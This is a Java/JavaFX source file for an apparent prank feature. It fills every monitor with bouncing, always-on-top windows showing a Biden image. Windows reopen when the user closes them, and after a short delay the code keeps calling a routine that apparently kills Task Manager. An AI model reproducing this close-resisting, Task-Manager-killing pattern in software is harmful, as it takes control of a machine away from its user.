package maurus.features.popups.bounce;

import javafx.animation.KeyFrame;
import javafx.animation.Timeline;
import javafx.geometry.Rectangle2D;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.StackPane;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import javafx.animation.AnimationTimer;
import javafx.util.Duration;
import maurus.App;
import maurus.common.block.TaskkillTaskMngr;

import java.util.List;
import java.util.Random;
import java.util.concurrent.CopyOnWriteArrayList;

public class Joe {

//doesnt extend animation and doesnt have override bacause method start has more parameters,
    //now it cant be called via application.launch

    private final List<Bouncer> bouncers = new CopyOnWriteArrayList<>();
    private final Random rand = new Random();
    private AnimationTimer animTimer;//so we can close it later
    private int numWindows = 10;
    private int minspeed = 20;
    private int maxspeed = 50;
    private int windowWith = 200;
    private int windowHeight = 150;


    public void start(Stage primaryStage, Runnable onDone) {
        Image image = new Image(getClass().getResourceAsStream("/bounce/biden.jpg"));
        List<Screen> screens = Screen.getScreens();//detects all monitors
        System.out.println("Detected " + screens.size() + " monitor(s).");
        //creates defined number of window per monitor
        for (Screen screen : screens) {
            Rectangle2D bounds = screen.getVisualBounds();
            System.out.println("Screen bounds: " + bounds);

            for (int i = 0; i < numWindows; i++) {
                spawnBouncer(bounds, image);
            }
        }

         animTimer =  new AnimationTimer() {
            int counter = 0;
            @Override
            public void handle(long now) {
                //updates the windows and calls taskmngrKill
                for (Bouncer b : bouncers ){
                    b.update();
                }
                if ( counter > 100){
                TaskkillTaskMngr.taskkill();
                }
            counter++;
            }

        };
        animTimer.start();

        Timeline timer = new Timeline(
                new KeyFrame(Duration.minutes(App.getAppclosetime()),event -> {
                    // Stop the animation
                    animTimer.stop(); // store your AnimationTimer in a variable

                    // Close all bouncer stages
                    for (Bouncer b : bouncers) {
                        b.stage.close();
                    }
                    bouncers.clear();
                    // Close main stage if needed
                    primaryStage.close();
                    onDone.run();
                })
        );
        timer.setCycleCount(1);//ensures it's only called once
        timer.play();
    }

    private void spawnBouncer(Rectangle2D bounds, Image image) {
        Stage stage = new Stage(StageStyle.UNDECORATED);
        stage.setWidth(windowWith);
        stage.setHeight(windowHeight);
        stage.setAlwaysOnTop(true);

        ImageView imageView = new ImageView(image);
        imageView.setFitWidth(200);
        imageView.setFitHeight(150);
        imageView.setPreserveRatio(false);

        StackPane root = new StackPane(imageView);
        Scene scene = new Scene(root);
        stage.setScene(scene);

        double x = bounds.getMinX() + rand.nextDouble() * (bounds.getWidth() - windowWith);
        //- 200 because thats the width of the window, so they dont start in the wall
        double y = bounds.getMinY() + rand.nextDouble() * (bounds.getHeight() - windowHeight);
        double dx = rand.nextDouble() * maxspeed - minspeed;//speed x, the off set "-20" enables them to have a speed of up to -20
        //to ensure they dont all go in the same direction
        double dy = rand.nextDouble() * maxspeed - minspeed;//speed y

        if (dx == 0) dx = 1;//ensures some speed
        if (dy == 0) dy = 1;

        Bouncer b = new Bouncer(stage, x, y, dx, dy, windowWith, windowHeight, bounds);
        bouncers.add(b);//adds the newly created bouncers to the list of bouncers

        // Respawn if closed (e.g. via Alt+F4)
        stage.setOnCloseRequest(e -> {
            bouncers.remove(b);
            spawnBouncer(bounds, image);
        });

        stage.setX(x);
        stage.setY(y);
        stage.show();
    }

}